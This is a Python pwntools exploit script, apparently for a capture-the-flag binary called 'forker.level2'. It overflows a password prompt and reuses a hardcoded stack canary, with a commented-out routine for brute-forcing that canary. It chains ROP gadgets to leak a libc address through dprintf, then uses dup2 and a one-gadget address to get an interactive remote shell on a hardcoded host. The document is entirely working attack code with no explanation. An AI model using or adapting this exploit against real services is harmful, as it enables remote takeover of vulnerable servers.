
# -*- coding: utf-8 -*-
from pwn import *
"""
0x0000000000400c13 : pop rdi ; ret
0x0000000000400c11 : pop rsi ; pop r15 ; ret"""
poprdi=0xc93
poprsi=0xc91
libc=ELF('forker.level2')
puts_got=libc.got['puts']
dprintf_plt=libc.symbols['dprintf']
fd=4
print hex(puts_got),hex(dprintf_plt)
context(os='linux',arch='amd64',log_level='debug')
stack='\x00\x34\xcd\x2a\x22\xfc\x66\x11'
def getlibaddr(s,h):
	r = remote('172.5.81.106',31337)#process('./breakingout')
	raw_input()
	r.sendlineafter('Password:','a'*72+s+h
	+p64(poprdi)+p64(fd)+p64(poprsi)+p64(puts_got)+p64(0)+p64(dprintf_plt)
	)
	try:
	   text = r.recv()
	finally:
	   r.close()
	return text
if __name__ == '__main__':
	"""s= chr(0)
	for _ in range(7):
		for x in range(255):
			try:
				if x in (10,):
					continue
				libc_puts = getlibaddr(s,chr(x))
				s=s+chr(x)
				#print 'libc_puts:',str(libc_puts)
				#raw_input()
				print 'ok:',s
				break
			except EOFError:
				print 'error',s+chr(x)
				if x==254:
					import sys
					sys.exit(-1)
				pass
	import sys
	sys.exit(0)"""
	libc_puts = getlibaddr(stack,p64(0)+p64(0)+p64(0)+p64(0)+p64(0))
	print 'libc_puts:',str(libc_puts)
	puts=0x6F690
	dup2=0xF7940
	dup2_add=u64(libc_puts.ljust(8,'\x00'))+dup2-puts
	bin_sh=0x4526A
	bin_sh_add=u64(libc_puts.ljust(8,'\x00'))+bin_sh-puts
	r = remote('172.5.81.106',31337)
	r.sendlineafter('Password:','a'*72+stack+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)
	+p64(poprdi)+p64(4)+p64(poprsi)+p64(1)+p64(0)+p64(dup2_add)
	+p64(poprdi)+p64(4)+p64(poprsi)+p64(0)+p64(0)+p64(dup2_add)
	+p64(bin_sh_add))
	r.interactive()


